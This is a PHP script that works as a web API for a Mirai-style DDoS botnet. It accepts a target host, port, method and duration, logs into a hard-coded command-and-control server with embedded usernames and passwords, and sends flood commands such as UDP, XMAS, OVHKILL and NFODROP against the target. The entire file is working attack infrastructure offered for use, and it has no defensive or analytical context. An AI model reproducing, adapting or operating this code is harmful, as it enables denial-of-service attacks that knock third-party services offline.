<?php
error_reporting(E_ALL);
 
 
   
 
 //   * Usage: http://84.201.20.53//Mirai.php?key=ipdowned&host=[host]&port=[port]&method=[method]&time=[time]


 
    $APIKeys = array("rootkey$7*!79654","usertest");

 
 
 

 
    $attackMethods = array("UDP", "STD", "STDHEX", "XMAS", "OVH", "NFO", "STOP");

 
 
 
    function htmlsc($string)
 
    {
 
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
 
    }
 
 
 
    // Check if all parameters are passed
 
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
 
        die("You are missing a parameter");
 
 
 
    // Variables for attack
 
    $key = htmlsc($_GET["key"]);
 
    $host = htmlsc($_GET["host"]);
 
    $port = htmlsc($_GET["port"]);
 
    $method = htmlsc(strtoupper($_GET["method"]));
 
    $time = htmlsc($_GET["time"]);
 
    $command = "";
 
 
 
    // Check if API key is valid
 
    if (!in_array($key, $APIKeys)) die("Invalid API key");
 
 
 
    // Check if attack method is valid
 
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
 
 
 
    // Set command for method (should really use a switch() statement but who cares?)
 
 
    if ($method == "STOP") $command = " ! STOP\r\n";

    else if ($method == "STD") $command = " !* STD $host $port $time\r\n";
    
    else if ($method == "STDHEX") $command = " stdhex $host $time dport=$port\r\n";
    
    else if ($method == "UDP") $command = " udp $host $time dport=$port\r\n";

    else if ($method == "XMAS") $command = " !* XMAS $host $port $time\r\n";

    else if ($method == "OVH") $command = " !* OVHKILL $host $port $time\r\n";

    else if ($method == "NFO") $command = " !* NFODROP $host $port $time\r\n";
  
    // Add other methods if you need them, I'm sure you're capable of doing that (I hope)
 
 
 
    // Connect

 
    $socket = fsockopen("84.201.20.53", 1302, $errno, $errstr, 30); // Le timeout est de 30 secondes

 
    ($socket ? null : die("Failed to connect"));
 
 
 
    // Login

 if ( $key  ==  "rootkey$7*!79654") 
 {
    fwrite($socket, " \r\n");

    sleep(3);
   
    fwrite($socket, "root\r\n"); // Username
   
    sleep(3);
   
    fwrite($socket, "lymak\r\n"); // Password

 }else {
   echo "Invalid API key";
 }


 if ( $key  ==  "usertest") 
 {
    fwrite($socket, " \r\n");

    sleep(3);
   
    fwrite($socket, "user\r\n"); // Username
   
    sleep(3);
   
    fwrite($socket, "test\r\n"); // Password

 }else {
   echo "Invalid API key";
 }
  
 
 
 
    // Send command
 
    sleep(9); // Why? I've noticed for some people it doesn't work w/o the sleep() (or anything before fwrite()ing $command)!
 
    fwrite($socket, $command);
 
 
 
    // Close connection
 
    fclose($socket);
 
    // Say the attack has been sent
 
   echo "API BY LYMAK ATTACKING $host:$port for $time seconds using method $method!\n";

 
   
?>